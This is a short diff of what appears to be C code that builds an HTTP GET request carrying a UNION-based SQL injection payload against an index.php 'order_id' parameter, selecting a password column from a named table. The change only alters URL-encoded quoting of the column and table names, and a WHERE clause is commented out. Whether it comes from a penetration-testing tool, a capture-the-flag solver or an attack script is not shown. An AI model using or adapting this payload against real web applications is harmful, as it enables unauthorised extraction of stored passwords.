@@ -276,9 +276,9 @@ bool check_password(const void *ctx) {
 
     const char *fmt =
         "GET /index.php?order_id=0%%20UNION%%20SELECT%%20"
-        "%%60%s%%60" // SELECT `pwd_col`
+        "%s" // SELECT `pwd_col`
         "%%20FROM%%20"
-        "%%60%s%%60%%20" // FROM `table_name`
+        "%s%%20" // FROM `table_name`
         //"WHERE%%20"
         //"%%60%s%%60" // WHERE `id_col`
         //"%%3d%%27322695107%%27%%20"
